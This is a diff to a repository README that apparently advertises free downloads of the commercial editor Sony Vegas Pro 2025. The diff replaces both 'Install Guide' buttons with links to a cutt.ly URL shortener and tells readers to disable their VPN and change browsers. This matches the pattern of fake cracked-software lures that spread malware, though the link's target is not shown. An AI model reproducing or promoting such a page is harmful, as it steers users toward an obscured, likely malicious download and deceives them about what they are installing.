@@ -5,7 +5,7 @@
 
 **Description**: Unleash your video editing potential with **Sony Vegas Pro 2025**, offering free access to cutting-edge tools! This repository provides tutorials, resources, and tips to explore Vegas Pro’s AI features like Auto Reframe and Motion Tracking. Download your free version and join our vibrant community of creators in 2025!  
 
-<a href="https://sonyvegasprohub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/wrNtmREn" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
@@ -32,7 +32,7 @@ Elevate your video skills with these straightforward steps to set up Sony Vegas 
    - Disable your VPN to avoid connection issues.  
    - Switch to another browser (e.g., Chrome, Firefox, or Edge) for a smoother process.  
 
-<a href="https://sonyvegasprohub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/wrNtmREn" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
@@ -92,11 +92,11 @@ Elevate your video skills with these straightforward steps to set up Sony Vegas 
 
 **Sony Vegas Pro 2025 Interface**  
 ![Sony Vegas Pro 2025 Interface](https://www.vegascreativesoftware.com/fileadmin/user_upload/products/vegas_pro/22/overview/i_136cbe/vegas-pro-product-audio.png)  
-*Intuitive workspace for video editing.*  
+ 
 
 **Editing Innovations**  
 ![Editing Innovations](https://imag.malavida.com/mvimgbig/download-fs/sony-vegas-1280-1.jpg)  
-*Explore AI-powered editing features.*  
+ 
 
 ---
 
